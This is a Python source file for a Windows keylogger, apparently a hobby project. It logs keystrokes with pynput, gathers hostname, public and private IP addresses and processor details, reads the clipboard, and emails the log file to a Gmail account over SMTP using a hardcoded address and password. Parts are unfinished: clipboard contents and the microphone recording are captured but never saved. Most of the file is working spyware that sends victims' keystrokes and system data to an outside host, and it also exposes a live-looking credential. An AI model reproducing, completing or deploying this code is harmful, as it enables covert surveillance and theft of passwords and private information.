# import pywin32 pynput scipy cryptography requests pillow sounddevice

# Libraries

# 1 Email Libraries -

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib


import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener  # keystrokes input library

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd  # audio library

from cryptography.fernet import Fernet  # Encryption Library

import getpass
from requests import get  # get usernames and passwords

from multiprocessing import Process, freeze_support  # for one screenshot at a time
from PIL import ImageGrab  # screenshot library


# Default Variables

keys_information = "key_log.txt"
system_information = "system_info.txt"
clipboard_information = "clipboard_info.txt"
microphone_time = 10  # time in seconds
email_address = "trashkeylogger@gmail.com"  # trash email address
password = "fyylgrzcjqftecbt"
toaddr = "trashkeylogger@gmail.com"
file_path = "C:\\Users\\RAHUL\\Desktop\\KeyLogger\\Project"
extend = "\\"  # it will add a extra slash in the path so that we can access the key_log.txt file

# Email Functionality


def send_email(filename, attachment, toaddr):
    # MIMEMultipart is a class that is used to create a message object that is a multipart message.
    msg = MIMEMultipart()

    msg['From'] = email_address
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    body = "Body of the Mail"
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename=%s" % filename)
    msg.attach(p)

    # 587 is the port number used to send email
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email_address, password)
    text = msg.as_string()
    s.sendmail(email_address, toaddr, text)
    s.quit()


send_email(keys_information, file_path + extend + keys_information, toaddr)


# getting Computer Information

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        try:
            # get public ip address
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)")

        # processor information
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " +
                platform.version() + '\n')  # system information
        f.write("Mchine: " + platform.machine() + '\n')  # machine information
        f.write("Hostname: " + hostname + '\n')  # hostname information
        f.write("Private IP Address: " + IPAddr + '\n')  # private ip address


computer_information()

# getting Clipboard Information


def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()  # open the clipboard
            pasted_data = win32clipboard.GetClipboardData()  # get the clipboard data
            win32clipboard.CloseClipboard()  # close the clipboard
        except:
            f.write("Clipboard could not be copied")


copy_clipboard()


# getting Audio Information

def microphone():
    fs = 44100  # sample frequency rate
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)


# Key Logger Functionality
count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)  # write the keys in the file
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:  # a is used to append the file
        for key in keys:
            # replace the single quotes with nothing
            k = str(key).replace("'", "")
            if "space" in k:  # if space is pressed then add a space
                f.write('\n')
            elif "Key" not in k:
                f.write(k)


def on_release(key):
    if key == Key.esc:  # if escape key is pressed then stop the keylogger
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
